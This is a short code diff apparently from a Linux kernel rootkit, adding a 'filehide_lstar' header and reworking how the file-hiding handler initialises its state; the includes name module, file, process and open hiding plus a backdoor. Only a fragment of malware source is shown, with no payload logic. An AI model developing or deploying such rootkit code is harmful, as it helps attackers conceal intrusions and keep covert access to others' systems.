@@ -9,6 +9,7 @@
 #include "common.h"
 #include "modhide.h"
 #include "filehide.h"
+#include "filehide_lstar.h"
 #include "openhide.h"
 #include "backdoor.h"
 #include "pidhide.h"
@@ -123,8 +124,11 @@ handle_modhide(unsigned long arg)
 int
 handle_filehide(unsigned long arg)
 {
-    static fh_state_t last_state
-        = rootkit.hiding_files == FH_OFF ? FH_TABLE : rootkit.hiding_files;
+    static fh_state_t last_state = FH_OFF;
+
+    if (last_state == FH_OFF)
+        last_state = rootkit.hiding_files
+            == FH_OFF ? FH_TABLE : rootkit.hiding_files;
 
     long sarg = (long)arg;
     bool set = rootkit.hiding_files;
